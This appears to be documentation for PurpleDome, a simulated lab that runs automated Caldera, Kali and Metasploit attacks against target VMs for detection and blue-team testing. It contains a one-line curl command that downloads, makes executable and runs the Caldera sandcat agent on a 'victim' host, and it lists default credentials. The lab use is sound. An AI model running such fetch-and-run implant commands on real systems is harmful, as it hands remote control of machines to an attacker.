======
Basics
======

Purple Dome is a simulated and automated environment to experiment with hacking - and defense.

PurpleDome is relevant for you:

* If you develop **sensors** for bolt on security
* If you want to test **detection logic** for your bolt on security
* If you want to stress test **mitigation** around your vulnerable apps
* Experiment with **hardening** your OS or software
* Want to **forensically** analyse a system after an attack
* Do some **blue team exercises**
* Want to **train ML** on data from real attacks

PurpleDome simulates a small business network. It generates an attacker VM and target VMs. Automated attacks are then run against the targets.

Depending on which sensors you picked you will get their logs. And the logs from the attacks. Perfect to compare them side-by-side.

Attacks are written as small plugins and control pre-installed tools:

* Kali command line tools
* Caldera commands
* Metasploit

That way your experiments focus on behaviour detection. And not on whack-a-mole games with malware samples.

-------------------

Features
========

* Linux and Windows targets
* VM controller abstracted as plugins
    * Local vagrant based (debug and development)
    * Cloud based
* Attacks as plugins controlling
    * Caldera attacks
    * Kali attacks
    * Metasploit attacks
* Data collection: Attack log and sensor data in parallel with timestamps for matching events
* Vulnerability plugins: Modify the targets before the attack
* Sensor plugins: Write a simple wrapper around your sensor and integrate it into the experiments

Components
==========

The command line tools are the way you will interact with Purple Dome. Find more in the *CLI* chapter.

You can configure the experiments in YAML files, the *configuration* chapter describes the format. Next you will also want to create some target VMs. This can be done manually or by using Vagrant. Vagrant makes it simple to create Linux targets. Windows targets (with some start configuration) are harder and have an own chapter.

If you want to modify Purple Dome and contribute to it I can point you to the *Extending* chapter. Thanks to a plugin interface this is simple.

Data aggregator
---------------

We use logstash


Caldera
-------

You can use the attack framework Caldera for pen testing and blue team training.

Starting it: *python3 server.py --insecure*

Web UI on *http://localhost:8888/*

Credentials: *red/admin*

Documentation: https://caldera.readthedocs.io/en/latest/

Installing client on victim (Linux):

server="http://192.168.178.45:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > sandcat.go;chmod +x sandcat.go;./sandcat.go -server $server -group red -v

Filebeat
--------

Filebeat collects logs on the target system.

It has a set of modules:

https://www.elastic.co/guide/en/beats/filebeat/6.8/filebeat-modules-overview.html

You can view a list of modules using: *filebeat modules list*


Logstash
--------

Filebeat uses Logstash to aggregate data into a json file.

Logstash uses all .conf files in /etc/logstash/conf.d

https://www.elastic.co/guide/en/logstash/current/config-setting-files.html

Repos
-----

You can find PurpleDome on github: https://git.int.avast.com/ai-research/purpledome
